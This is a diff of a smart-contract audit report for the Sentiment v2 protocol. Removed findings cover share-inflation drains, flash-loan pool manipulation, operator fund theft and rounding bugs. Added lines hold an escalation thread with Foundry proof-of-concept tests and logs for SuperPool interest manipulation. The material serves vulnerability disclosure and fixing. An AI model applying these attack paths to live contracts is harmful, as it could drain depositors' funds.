-    RedstoneDefaultsLib.validateTimestamp(receivedTimestampMilliseconds);
-  }
-```
-
-The `validateTimestamp` function can be overridden. It's possible to retrieve the actual timestamp by overriding the `validateTimestamp` function and prevent any possible oracle DOS due to the time lag.
-
-### Internal pre-conditions
-
-_No response_
-
-### External pre-conditions
-
-_No response_
-
-### Attack Path
-
-_No response_
-
-### Impact
-
-Possible Oracle DOS due to lagging priceTimestamp
-
-### PoC
-
-_No response_
-
-### Mitigation
-
-Override `validateTimestamp` to retrieve the actual timestamp, as an example:
-
-```solidity
-function validateTimestamp(uint256 timestamp) public view override {
-  priceTimestamp = timestamp;
-  super.validateTimestamp(timestamp);
-
-}
-```
-
-# Issue M-35: The Rounding Done in Protocol's Favor Can Be Weaponized to Drain the Protocol 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/481 
-
-## Found by 
-goluu
-## Summary
-Empty pools' assets have been drained by the first depositor via inflating share prices.
-
-## Vulnerability Detail
-
-- **Empty Pool Condition:** The vulnerability occurs when the pool's total supply is zero.
-- **Initial Deposit:** The attacker deposits 1000 wei worth of underlying assets. 
-- **Borrowing:** The attacker borrows 1000 wei using the borrow function.
-- **transfer amount** Position  manager mint  shares via transfer amount  
-- **Partial Repayment:** Within the same block, the attacker repays 1000 wei. Due to rounding in favor of the protocol, total assets become 1001 wei, while the total supply remains 1000.
-![image](https://github.com/user-attachments/assets/cb13b08c-8230-431f-bd15-edb89adad380)
-
-- **Withdraw:** The attacker withdraws 999 wei, leaving the pool with a total supply of 1 and total assets of 2 wei.
-![image](https://github.com/user-attachments/assets/7a4529d7-e948-446d-ab39-e8036323646e)
-
-- **Inflation Attack:** The attacker repeatedly deposits and withdraws (total assets - 1) in the pool more than 80 times in a loop, leading to an inflated share price.
-
-```solidity
- function testfirstdepositor() external {
-    uint assets = 1000;
-    vm.assume(assets > 0);
-    vm.startPrank(user);
-
-    asset1.mint(user, 1000e18);
-    asset1.approve(address(pool), assets);
-
-    pool.deposit(linearRatePool, 1000, user);
-    assertEq(pool.getAssetsOf(linearRatePool, user), assets);
-    assertEq(pool.balanceOf(user, linearRatePool), assets); // Shares equal 1:1 at first
-    vm.stopPrank();
-
-    vm.startPrank(registry.addressFor(SENTIMENT_POSITION_MANAGER_KEY));
-    pool.borrow(linearRatePool, user, assets);
-    vm.warp(block.timestamp + 10);
-    vm.roll(block.number + 1 );
-    asset1.mint(address(pool),1001);
-    pool.repay(linearRatePool, user, assets + 1);
-
-
-    vm.stopPrank();
-    vm.startPrank(user);
-    pool.withdraw(linearRatePool, 999 , user, user);
-
-
-    asset1.mint(user, assets);
-    asset1.approve(address(pool), 1000e18);
-
-    uint256 n = 60;
-    for(uint8 i = 0; i < n; i++){
-        uint256 amount = i ** 2 + 1;
-        pool.deposit(linearRatePool, amount , user);
-    
-        pool.withdraw(linearRatePool, 1 ,user,user);
-        (,,,,,,,,,uint256 totalDepositAssets,uint256 totalDepositShares) = pool.poolDataFor(linearRatePool);
-        require (totalDepositShares == 1, "should be one ");
-
-
-
-    }
- 
- 
- 
-```
-
-
-## Impact
-
-The first depositor loses their funds as the attacker manipulates the share price to drain the pool's assets.
-
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L275
-
-## Recommendation
-
-Implement virtual shares or another mechanism to prevent rounding errors and price manipulation, especially when the pool is empty or has a very low total supply.
-
-# Issue M-36: In `SuperPool`, an attacker can move assets to a specific base pool 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/487 
-
-## Found by 
-iamnmt
-### Summary
-
-In `SuperPool`, the design supply to pools and withdraw from pools in queue will allow an attacker to move assets to a specific base pool.
-
-### Root Cause
-
-The design supply to pools and withdraw from pools in queue
-
-https://github.com/sentimentxyz/protocol-v2/blob/04bf15565165396608cc0aedacf05897235518fd/src/SuperPool.sol#L524-L543
-https://github.com/sentimentxyz/protocol-v2/blob/04bf15565165396608cc0aedacf05897235518fd/src/SuperPool.sol#L548-L580
-
-### Internal pre-conditions
-
-Let's call a base pool that an attacker want to move assets is `X`.
-1. Every base pool before `X` in `depositQueue` have `SuperPool#poolCapFor[poolId] != type(uint256).max` or `Pool#poolDataFor[poolId].poolCap != type(uint256).max`. The meaning of this pre-condition is there is way to deposit to `X`. 
-2. There is exist a base pool before `X` in `withdrawQueue` that the `SuperPool` has assets in.
-
-### External pre-conditions
-
-_No response_
-
-### Attack Path
-
-There is a `SuperPool` that has:
-- `depositQueue = [A, B, X]`
-- `SuperPool#poolCapFor[A] = 100, Pool#poolDataFor[B].poolCap = 100`
-- `Pool#getTotalAssets(A) = 50, Pool#getTotalAssets(B) = 50, Pool#getTotalAssets(X) = 0`
-- `Pool#getAssetsOf(A, address(SuperPool)) = 50, Pool#getAssetsOf(B, address(SuperPool)) = 50, Pool#getAssetsOf(X, address(SuperPool)) = 0`
-- `withdrawQueue = [A, B, X]`
-
-This `SuperPool` is satisfied the internal pre-conditions. The base pool `A` represents for base pools that have `SuperPool#poolCapFor[poolId] != type(uint256).max`. The base pool `B` represents for base pools that have `Pool#poolDataFor[poolId].poolCap != type(uint256).max`. The goal of this attack is to move assets from `A, B` to `X`.
-
-An attacker performs the attack in one transaction:
-1. Call to `SuperPool#deposit(50, attacker)`. New state:
-   - `Pool#getTotalAssets(A) = 100`
-   - `Pool#getAssetsOf(A, address(SuperPool)) = 100`
-2. Call to `Pool#deposit(B, 50, attacker)`. New state:
-   - `Pool#getTotalAssets(B) = 100`
-3. Call to `SuperPool#deposit(100, attacker)`. The `SuperPool` will deposit to `X` because `SuperPool#poolCapFor[A], Pool#poolDataFor[B].poolCap` are reached. New state:
-   - `Pool#getTotalAssets(X) = 100`
-   - `Pool#getAssetsOf(X, address(SuperPool)) = 100`
-4. Call to `SuperPool#withdraw(100, attacker, attacker)`. New state:
-   - `Pool#getTotalAssets(A) = 0, Pool#getTotalAssets(B) = 0, Pool#getTotalAssets(X) = 100`
-   - `Pool#getAssetsOf(A, address(SuperPool)) = 0, Pool#getAssetsOf(B, address(SuperPool)) = 0, Pool#getAssetsOf(X, address(SuperPool)) = 100`
-5. Call to `Pool#withdraw(B, 50, attacker)`. The attacker retrieves the funds deposited in step 2.
-
-The attacker moved all assets to `X`. By doing this attack in one transaction, the attacker can flash-loan `150` tokens at the start of the attack for step 1 and 2, and then returns `150` tokens back at the end of the attack. Note that, the attacker does not hold any shares of `SuperPool` or `Pool` at the end of the attack. Meaning the cost this attack is only gas fee and flash-loan fee.
-
-### Impact
-
-By moving assets to a specific base pool, an attacker can cause the following larger impacts:
-- Front-running `PositionManager#liquidateBadDebt` with this attack to cause loss of funds for the `SuperPool`. When the protocol calls `PositionManager#liquidateBadDebt`, a base pool that has its bad debt being liquidated will suffer a loss. So, the attacker will move assets from other pools to the pools that has its bad debt being liquidated, which will cause loss of funds to the `SuperPool`.
-- Use liquidity from other pools for withdrawing in the attacker's desired pool. Users can not call to `Pool#withdraw` when `maxWithdrawAssets` is not enough. In case of, the pool that the attacker want to withdraw from does not have enough liquidity, the attacker can perform this attack to move assets from other pools to their desired pool.
-- Move assets to a low performance pool to cause loss of yield for the `SuperPool`.
-
-### PoC
-
-_No response_
-
-### Mitigation
-
-Add a two-step `SuperPool#deposit/mint`. First the users stage their `deposit/mint`. After a short timelock (E.g: 10 seconds), the users can finalize their `deposit/mint`. This will prevent the attack that uses flash-loan, but if the attacker has enough liquidity, then this attack still can happen.
-
-# Issue M-37: User can revert the `positionBeacon`  value set by  the ADMIN. 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/506 
-
-## Found by 
-0xRstStn, Tendency, dhank
-## Summary
-User can revert the `positionBeacon`  value set by  the ADMIN.
-
-## Vulnerability Detail
-Using  the `setBeacon()` , owner can change the value of `positionBeacon` to a  new Address.
-
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L503-L506
-
-At the same time we have `updateRegistry()` which is a public function where the positionBeacon is set from the values of Registr contract.
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L204-L208
-
-    function updateFromRegistry() public {
-        pool = Pool(registry.addressFor(SENTIMENT_POOL_KEY));
-        riskEngine = RiskEngine(registry.addressFor(SENTIMENT_RISK_ENGINE_KEY));
-        positionBeacon = registry.addressFor(SENTIMENT_POSITION_BEACON_KEY);
-    }
-## Impact
-Any User can revert the `positionBeacon`  value set by  the ADMIN.
-
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L204-L208
-
-## Tool used
-
-Manual Review
-
-## Recommendation
-
-positionBeacon update can be omiited from the updateRegistry.
-
-# Issue M-38: Security considerations of ERC6909 are not complied, thus an operator can steal funds 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/519 
-
-## Found by 
-dimah7
-## Summary
-
-The protocol's pools are strictly compilant with ERC6909, which introduces the `operator` model. An operator is an account which is granted permission to transfer assets on behalf of the `owner`. 
-
-Also according to [ERC6909 specification security considerations](https://eips.ethereum.org/EIPS/eip-6909#security-considerations): 
-
-1. ```The first consideration is consistent with all delegated permission models. Any account with operator permissions may transfer any amount of any token id on behalf of the owner until the operator permission is revoked```
-2. ```The second consideration is unique to systems with both delegated permission models. In accordance with the `transferFrom`In accordance with the transferFrom method method, spenders with operator permission are not subject to allowance restrictions, spenders with infinite approvals SHOULD NOT have their allowance deducted on delegated transfers``` 
-
-However these security considerations are not taken of concern. This allows an operator to transfer all the available token balance of the `owner` to himself. And since for this contest, it's confirmed that only the owners of pools, super pools and position manager are considered as TRUSTED, the operator role is not an owner i consider this scenario likely to happen.
-
-## Vulnerability Detail
-
-The problem lies in the `Pool::withdraw()` function: 
-
-```javascript
-function withdraw(uint256 poolId, uint256 assets, address receiver, address owner) public returns (uint256 shares) {
-        ...
-        if (msg.sender != owner && !isOperator[owner][msg.sender]) {
-            uint256 allowed = allowance[owner][msg.sender][poolId];
-            if (allowed != type(uint256).max) allowance[owner][msg.sender][poolId] = allowed - shares;
-        }
-        ...
-
-@>      IERC20(pool.asset).safeTransfer(receiver, assets);
-```
-
-As can be seen the caller can specify any address as the receiver.
-
-## Impact
-
-- Impact: High, the entire balance of the owner can be drained
-- Likelihood: Medium, because:
-  - 1. an owner can revoke the operator role anytime, so an operator can frontrun such transactions to prevent, but some chains have private mempools, so this only partially mitigates the likelihood
-  - 2. since by spec, the operator is granted infinite approval, the attacker needs only one successful tx to steal the tokens
-- Overall: High/Medium -> High
-
-## Code Snippet
-
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L371
-
-## Tool used
-
-Manual Review
-
-## Recommendation
-
-Restrict the operator to be able to transfer to himself: 
-
-```javascript
-if (receiver == msg.sender && msg.sender != owner) revert("Operator cannot transfer to themselves");
-```
-
-But since he can choose any address, this exploit is not fully mitigated, consider if having an operator for the pools is in need.
-
-# Issue M-39: Rounding Error in Calculating `newBorrowAssets` during borrow/repayment 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/529 
-
-## Found by 
-0xAlix2, KupiaSec
-## Summary
-During the borrow/repayment operation in the pool, a rounding error arises when calculating `newBorrowAssets`, causing it to mismatch with the amount returned by `getBorrowsOf`, which I believe should align.
-
-## Vulnerability Detail
-`newBorrowAssets` is meant to indicate the entire debt associated with a position, capturing the total amount of assets required to fully repay the debt obligation.
-I believe it should match the value given by getBorrowsOf, assuming that a repayment could occur immediately without any interest having accrued. Nevertheless, due to differences in the rounding directions used in these calculations, inconsistencies can occur.
-
-As a consequence, even a small discrepancy might lead to `newBorrowAssets` falling below `minDebt`, which in turn can trigger the transaction to revert with the `Pool_DebtTooLow` error.
-
-In `borrow` function, it used Math.Rounding.Down:
-```solidity
-    function borrow(uint256 poolId, address position, uint256 amt) external returns (uint256 borrowShares) {
-        ...
-        uint256 newBorrowAssets = _convertToAssets(
-            borrowSharesOf[poolId][position] + borrowShares,
-            pool.totalBorrowAssets + amt,
-            pool.totalBorrowShares + borrowShares,
->           Math.Rounding.Down
+        /*//////////////////////////////////////////////////////////////
+                     user_1 DEPOSITNG TO SUPERPOOL
+        //////////////////////////////////////////////////////////////*/
+
+        vm.startPrank(user_1);
+        asset1.mint(user_1, 1e18);
+
+        asset1.approve(address(superPool), type(uint256).max);
+
+        superPool.deposit(1e18, user_1);
+        vm.stopPrank();
+        console2.log(
+            "SuperPool(SHARES) Balance of User1: ",
+            superPool.balanceOf(user_1)
         );
-        if (_getValueOf(pool.asset, newBorrowAssets) < minDebt) {
-            revert Pool_DebtTooLow(poolId, pool.asset, newBorrowAssets);
-        }
-```
-In `getBorrowsOf` function, it used Math.Rounding.Up:
-```solidity
-    function getBorrowsOf(uint256 poolId, address position) public view returns (uint256) {
-        PoolData storage pool = poolDataFor[poolId];
-        (uint256 accruedInterest,) = simulateAccrue(pool);
-        // [ROUND] round up to enable enable complete debt repayment
-        return _convertToAssets(
-            borrowSharesOf[poolId][position],
-            pool.totalBorrowAssets + accruedInterest,
-            pool.totalBorrowShares,
->            Math.Rounding.Up
+        console2.log(
+            "SuperPool(SHARES) Balance of FeeRecipient: ",
+            superPool.balanceOf(feeRecipient)
+        );
+        
+        /*//////////////////////////////////////////////////////////////
+                           NOW SUPERPOOL ACCUMATES INTEREST
+        //////////////////////////////////////////////////////////////*/
+        
+        asset1.mint(address(superPool), 0.5e18);
+        superPool.accrue();
+        
+        console2.log(
+            "SuperPool(SHARES) Balance of FeeRecipient: ",
+            superPool.balanceOf(feeRecipient)
+        );
+        console2.log(
+            " assest1 balance of superpool: ",
+            asset1.balanceOf(address(superPool))
+        );
+
+        console2.log("SuperPool(SHARES) Total Supply: ", superPool.totalSupply());
+
+        console2.log("Preview Mint for User1: ", superPool.previewMint(1111));
+        console2.log(
+            "Preview Mint for FeeRecipient: ",
+            superPool.previewMint(156)
+        );
+        console2.log("Preview Mint for dead: ", superPool.previewMint(1000));
+        // assert that the preview mint for dead is greater than the 40% of the total supply of superpool asset1
+        // console2.log(
+        //     "DEAD ADDRESS END: ",
+        //     superPool.balanceOf(0x000000000000000000000000000000000000dEaD)
+        // );
+        assert(
+            superPool.previewMint(SHARES_OF_DEAD_ADDRESS) >
+                (superPool.totalSupply() * 0.4e18) / 1e18
         );
     }
+}
 ```
 
-Same happens in `repay` function:
 ```solidity
-    function repay(uint256 poolId, address position, uint256 amt) external returns (uint256 remainingShares) {
-        ...
-        remainingShares = borrowSharesOf[poolId][position] - borrowShares;
-        if (remainingShares > 0) {
-            uint256 newBorrowAssets = _convertToAssets(
->               remainingShares, pool.totalBorrowAssets - amt, pool.totalBorrowShares - borrowShares, Math.Rounding.Down
-            );
-            if (_getValueOf(pool.asset, newBorrowAssets) < minDebt) {
-                revert Pool_DebtTooLow(poolId, pool.asset, newBorrowAssets);
-            }
-        }
+Logs:
+  SuperPool(SHARES) Balance of User1:  1111
+  SuperPool(SHARES) Balance of FeeRecipient:  111
+  SuperPool(SHARES) Balance of FeeRecipient:  156
+   assest1 balance of superpool:  2500000000000001000
+  SuperPool(SHARES) Total Supply:  2267
+  Preview Mint for User1:  1224647266313933471
+  Preview Mint for FeeRecipient:  171957671957672027
+  Preview Mint for dead:  1102292768959436068
 ```
 
-## Impact
-This represents a notable instance of a `rounding error`, and although it is not a frequent occurrence, it can cause borrow or repay operations to unjustly revert with the `Pool_DebtTooLow` error.
+My decision to reject the escalation remains.
 
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L450
+**ARNO-0**
 
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L238
+@cvetanovv 
+I apologize for a small mistake in the report’s PoC (I used totalSupply instead of totalAssets() in the assertion but issue is still valid), which may have caused some confusion. In case you still don’t fully understand the issue and how ERC4626 (superpool) works here. Let me explain in detail how the interest system used by the team distributes interest and how an attacker can manipulate the system with no effort and minimal value. In the 4th point, I explained how the changes you made in PoC 2 do not mean anything.
 
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L509
+1) **ERC4626 mints shares which represent the assets owned in the vault.** Generally, this vault accumulates yield, which is then distributed to the shareholders of the vault. Shares remain constant since only the underlying asset supply is increased. Accumulated interest/yield can then be claimed by users of the vault (ERC4626/superpool) using generic redeem/withdraw functions according to the shares they own. Now, their withdrawn asset will be greater than the deposited amount for the reason I explained above. Superpool here works the same way.
 
-## Tool used
-Manual Review
+2) **When yield/interest is accumulated in the vault, this function is used to update the `lastTotalAssets`:**
 
-## Recommendation
-Adjust the rounding method to `Math.Rounding.Up` when calculating `newBorrowAssets`.
+```solidity
+function accrue() public {
+    (uint256 feeShares, uint256 newTotalAssets) = simulateAccrue();
+    if (feeShares != 0) ERC20._mint(feeRecipient, feeShares);
+    lastTotalAssets = newTotalAssets;
+}
+```
 
-In `borrow` function:
-```diff
-    function borrow(uint256 poolId, address position, uint256 amt) external returns (uint256 borrowShares) {
-        ...
-        uint256 newBorrowAssets = _convertToAssets(
-            borrowSharesOf[poolId][position] + borrowShares,
-            pool.totalBorrowAssets + amt,
-            pool.totalBorrowShares + borrowShares,
--           Math.Rounding.Down
-+           Math.Rounding.Up
+This is crucial since it represents the assets deposited by users and the interest accumulated. Also, some percentage of the interest is taken as a fee, and then new shares are minted to the `feeRecipient` after `accrue()` is called, which is called every time there is a change in the underlying assets. This can be seen in this function:
+
+```solidity
+function simulateAccrue() internal view returns (uint256, uint256) {
+    uint256 newTotalAssets = totalAssets();
+    uint256 interestAccrued = (newTotalAssets > lastTotalAssets) ? newTotalAssets - lastTotalAssets : 0;
+    if (interestAccrued == 0 || fee == 0) return (0, newTotalAssets);
+
+    uint256 feeAssets = interestAccrued.mulDiv(fee, WAD);
+    // newTotalAssets already includes feeAssets
+    uint256 feeShares = _convertToShares(feeAssets, newTotalAssets - feeAssets, totalSupply(), Math.Rounding.Down);
+
+    return (feeShares, newTotalAssets);
+}
+```
+
+The line `(newTotalAssets > lastTotalAssets)` flags that the balance of the pool went up, which means we need to update the state variable `lastTotalAssets` so that the interest can be claimed by the users of the pool. So it shows that shares owned by the users of the pool remain constant; interest accumulation literally means that the underlying asset supply increased in the pool. Therefore, the argument given by you, `This "dead address" does not accumulate any interest,` is invalid.
+
+3) **As I mentioned earlier, shares represent the ownership of the assets in the vault.** Suppose user 1 deposited 1e18 in the pool (no other user in the pool); shares minted are also 1e18 (it does not matter how many are minted). So we say that user 1 has 100% ownership of the balance of the underlying assets. If user 2 deposits 1e18 and mints 1e18 shares, we can say that user 2 has 50% shares of the total minted shares(2e18) and 50% ownership on the total assest balance of the pool. So if the pool accumulates interest, let's suppose 1e18, still both users will have 50% ownership (user_1 shares = 1e18, user_2 shares = 1e18 remains constant), i.e., 1.5e18 assets each( this is the amount they can claim from the pool).
+
+4) The changes you made in PoC 2 literally do not do anything; you just checked the shares owned by the dead address, and obviously, they would remain constant. The attacker still sent funds directly to the pool, and then when a user called `deposit`, `accrue` was called first. Then `lastTotalAssets` was updated to the current balance of the pool, which made the pool mint fewer shares (inflated share price).
+
+5) In short, if the interest is accumulated before any user deposits into the pool, it will favor dead addresses during interest distribution.
+
+6) If you remove the attack from the PoC and deposit normally, you’ll see that 99% of the accumulated interest can be claimed by the user and the `feeRecipient`.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import "../BaseTest.t.sol";
+import {console2} from "forge-std/console2.sol";
+import {FixedPriceOracle} from "src/oracle/FixedPriceOracle.sol";
+
+contract SuperPoolUnitTests is BaseTest {
+    uint256 initialDepositAmt = 1e5;
+
+    Pool pool;
+    Registry registry;
+    SuperPool superPool;
+    RiskEngine riskEngine;
+    SuperPoolFactory superPoolFactory;
+    address user_1 = makeAddr("User_1");
+
+    address attacker = makeAddr("Attacker");
+
+    address public feeTo = makeAddr("FeeTo");
+
+    function setUp() public override {
+        super.setUp();
+
+        pool = protocol.pool();
+        registry = protocol.registry();
+        riskEngine = protocol.riskEngine();
+        superPoolFactory = protocol.superPoolFactory();
+
+        FixedPriceOracle asset1Oracle = new FixedPriceOracle(1e18);
+        vm.prank(protocolOwner);
+        riskEngine.setOracle(address(asset1), address(asset1Oracle));
+    }
+
+    function test_interest_manipulation_WITH_BUG_2() public {
+        address feeRecipient = makeAddr("FeeRecipient");
+
+        vm.prank(protocolOwner);
+        asset1.mint(address(this), initialDepositAmt);
+        asset1.approve(address(superPoolFactory), initialDepositAmt);
+
+        address deployed = superPoolFactory.deploySuperPool(
+            poolOwner,
+            address(asset1),
+            feeRecipient,
+            1e17,
+            type(uint256).max,
+            initialDepositAmt,
+            "test",
+            "test"
         );
-        if (_getValueOf(pool.asset, newBorrowAssets) < minDebt) {
-            revert Pool_DebtTooLow(poolId, pool.asset, newBorrowAssets);
-        }
-```
+        superPool = SuperPool(deployed);
 
-In `repay` function:
-```diff
-    function repay(uint256 poolId, address position, uint256 amt) external returns (uint256 remainingShares) {
-        ...
-        remainingShares = borrowSharesOf[poolId][position] - borrowShares;
-        if (remainingShares > 0) {
-            uint256 newBorrowAssets = _convertToAssets(
--               remainingShares, pool.totalBorrowAssets - amt, pool.totalBorrowShares - borrowShares, Math.Rounding.Down
-+               remainingShares, pool.totalBorrowAssets - amt, pool.totalBorrowShares - borrowShares, Math.Rounding.Up
-            );
-            if (_getValueOf(pool.asset, newBorrowAssets) < minDebt) {
-                revert Pool_DebtTooLow(poolId, pool.asset, newBorrowAssets);
-            }
-        }
-```
+        /*//////////////////////////////////////////////////////////////
+                     user_1 DEPOSITNG TO SUPERPOOL
+        //////////////////////////////////////////////////////////////*/
 
-# Issue M-40: Lack of oracle validation in `acceptLtvUpdate` can result in a DoS for the Pool-Asset pair 
+        vm.startPrank(user_1);
+        asset1.mint(user_1, 1e18);
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/548 
+        asset1.approve(address(superPool), type(uint256).max);
 
-## Found by 
-Yashar
-## Summary
-The `RiskEngine.sol` allows pool owners to request LTV updates with a 72-hour timelock. However, while the `requestLtvUpdate` function checks for a valid oracle, the `acceptLtvUpdate` function does not. This could lead to a situation where an LTV update is accepted after the oracle has been removed or invalidated, resulting in DoS for the Pool-Asset pair.
+        superPool.deposit(1e18, user_1);
+        vm.stopPrank();
+        console2.log(
+            "SuperPool(SHARES) Balance of User1 after depositing 1e18: ",
+            superPool.balanceOf(user_1)
+        );
+        console2.log(
+            "SuperPool(SHARES) Balance of FeeRecipient: ",
+            superPool.balanceOf(feeRecipient)
+        );
 
-## Vulnerability Detail
-Pool owners can [update LTV parameters](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L167-L187) using the `requestLtvUpdate` function, which employs a 72-hour timelock before the LTV change takes effect. During the request phase, the function [ensures a valid oracle is set](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L171) for the asset:
-```solidity
-        // set oracle before ltv so risk modules don't have to explicitly check if an oracle exists
-        if (oracleFor[asset] == address(0)) revert RiskEngine_NoOracleFound(asset);
-```
+        /*//////////////////////////////////////////////////////////////
+                           NOW SUPERPOOL ACCUMATES INTEREST
+        //////////////////////////////////////////////////////////////*/
 
-After the timelock, the pool owner [can accept this request via the `acceptLtvUpdate`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L190-L210) function. However, given the 72-hour delay, there is a possibility that the protocol's admin could remove or change the oracle for the asset. The `acceptLtvUpdate` function does not re-check the oracle's validity before updating the LTV:
-```solidity
-    function acceptLtvUpdate(uint256 poolId, address asset) external {
-        if (msg.sender != pool.ownerOf(poolId)) revert RiskEngine_OnlyPoolOwner(poolId, msg.sender);
+        asset1.mint(address(superPool), 10e18); // can be 0.5e18 as well as in report poc
+        superPool.accrue();
+        uint SHARES_OF_DEAD_ADDRESS = superPool.balanceOf(
+            0x000000000000000000000000000000000000dEaD
+        );
+        console2.log(
+            "SuperPool(SHARES) Balance of FeeRecipient after interest accumulates: ",
+            superPool.balanceOf(feeRecipient)
+        );
+        console2.log(
+            "Assest balance of superpool after interest accumulates: ",
+            asset1.balanceOf(address(superPool))
+        );
 
-        LtvUpdate memory ltvUpdate = ltvUpdateFor[poolId][asset];
+        console2.log(
+            "SuperPool(SHARES) Total Supply after interest accumulates: ",
+            superPool.totalSupply()
+        );
 
-        // revert if there is no pending update
-        if (ltvUpdate.validAfter == 0) revert RiskEngine_NoLtvUpdate(poolId, asset);
+        console2.log(
+            "Preview Redeem for User1: ",
+            superPool.previewRedeem(superPool.balanceOf(user_1))
+        );
+        console2.log(
+            "Preview Redeem for FeeRecipient: ",
+            superPool.previewRedeem(superPool.balanceOf(feeRecipient))
+        );
+        console2.log(
+            "Preview Redeem for dead: ",
+            superPool.previewRedeem(SHARES_OF_DEAD_ADDRESS)
+        );
+        //
+        console2.log("totalAssets() : ", superPool.totalAssets());
+       
 
-        // revert if called before timelock delay has passed
-        if (ltvUpdate.validAfter > block.timestamp) revert RiskEngine_LtvUpdateTimelocked(poolId, asset);
+        console2.log(
+            "% of total assest the dead shares can claim: ",
+            (superPool.previewRedeem(SHARES_OF_DEAD_ADDRESS) * 1e18) /
+                superPool.totalAssets()
+        );
 
-        // revert if timelock deadline has passed
-        if (block.timestamp > ltvUpdate.validAfter + TIMELOCK_DEADLINE) {
-            revert RiskEngine_LtvUpdateExpired(poolId, asset);
-        }
-
-        // apply changes
-        ltvFor[poolId][asset] = ltvUpdate.ltv;
-        delete ltvUpdateFor[poolId][asset];
-        emit LtvUpdateAccepted(poolId, asset, ltvUpdate.ltv);
+        console2.log(
+            "% of total assest the user1 and feeRecipient shares can claim: ",
+            ((superPool.previewRedeem(superPool.balanceOf(user_1)) +
+                superPool.previewRedeem(superPool.balanceOf(feeRecipient))) *
+                1e18) / superPool.totalAssets()
+        );
+         // claimable interest is greater than 99% of the total assets
+        assert(
+            superPool.previewRedeem(superPool.balanceOf(user_1)) +
+                superPool.previewRedeem(superPool.balanceOf(feeRecipient)) >
+                (superPool.totalAssets() * 0.99e18) / 1e18
+        );
     }
+}
+
+
+
 ```
 
-If the LTV is updated for an asset without an oracle, the `getAssetValue` function, which [fetches the asset's price from the oracle](https://github.com/sentimentxyz/protocol-v2/blob/04bf15565165396608cc0aedacf05897235518fd/src/RiskModule.sol#L183-L187), will always revert, resulting in a DoS for the given Pool-Asset pair.
+```solidity
 
-## Impact
-If the LTV is updated for an asset without an oracle, it will cause a DoS for the affected Pool-Asset pair, as any attempts to fetch the asset's value will revert.
+Logs:
+  SuperPool(SHARES) Balance of User1 after depositing 1e18:  1000000000000000000
+  SuperPool(SHARES) Balance of FeeRecipient:  0
+  SuperPool(SHARES) Balance of FeeRecipient after interest accumulates:  100000000000009000
+  Assest balance of superpool after interest accumulates:  11000000000000100000
+  SuperPool(SHARES) Total Supply after interest accumulates:  1100000000000109000
+  Preview Redeem for User1:  9999999999999099991
+  Preview Redeem for FeeRecipient:  999999999999999999
+  Preview Redeem for dead:  999999
+  totalAssets() :  11000000000000100000
+  % of total assest the dead shares can claim:  90908
+  % of total assest the user1 and feeRecipient shares can claim:  999999999999909090
+  
+```
 
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L167-L187
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L190-L210
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskModule.sol#L183-L187
 
-## Tool used
+**ARNO-0**
 
-Manual Review
+Here is the corrected PoC. I changed `previewMint` to `previewRedeem` (it doesn’t matter whether it's `previewMint` or `previewRedeem`; the underlying logic is the same as both return the assets in exchange for shares as input) and replaced `totalSupply()` with `totalAssets()`.
 
-## Recommendation
-Re-check the validity of the oracle for the asset upon accepting the ltv update:
-```diff
-    function acceptLtvUpdate(uint256 poolId, address asset) external {
-        if (msg.sender != pool.ownerOf(poolId)) revert RiskEngine_OnlyPoolOwner(poolId, msg.sender);
+2) The attack demonstrates that less than 60% (exact value: 587497164071362276 / 1e18 = 58.749%) of the underlying assets are owned by the combined `user_1` and `FeeRecipient`, while the rest are owned by dead shares (exact value: 412498710941528307 / 1e18 = 41.24%).
 
-+       if (oracleFor[asset] == address(0)) revert RiskEngine_NoOracleFound(asset);
-+
-        LtvUpdate memory ltvUpdate = ltvUpdateFor[poolId][asset];
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
 
-        // revert if there is no pending update
-        if (ltvUpdate.validAfter == 0) revert RiskEngine_NoLtvUpdate(poolId, asset);
+import "../BaseTest.t.sol";
+import {console2} from "forge-std/console2.sol";
+import {FixedPriceOracle} from "src/oracle/FixedPriceOracle.sol";
 
-        // revert if called before timelock delay has passed
-        if (ltvUpdate.validAfter > block.timestamp) revert RiskEngine_LtvUpdateTimelocked(poolId, asset);
+contract SuperPoolUnitTests is BaseTest {
+    uint256 initialDepositAmt = 1e5;
 
-        // revert if timelock deadline has passed
-        if (block.timestamp > ltvUpdate.validAfter + TIMELOCK_DEADLINE) {
-            revert RiskEngine_LtvUpdateExpired(poolId, asset);
-        }
+    Pool pool;
+    Registry registry;
+    SuperPool superPool;
+    RiskEngine riskEngine;
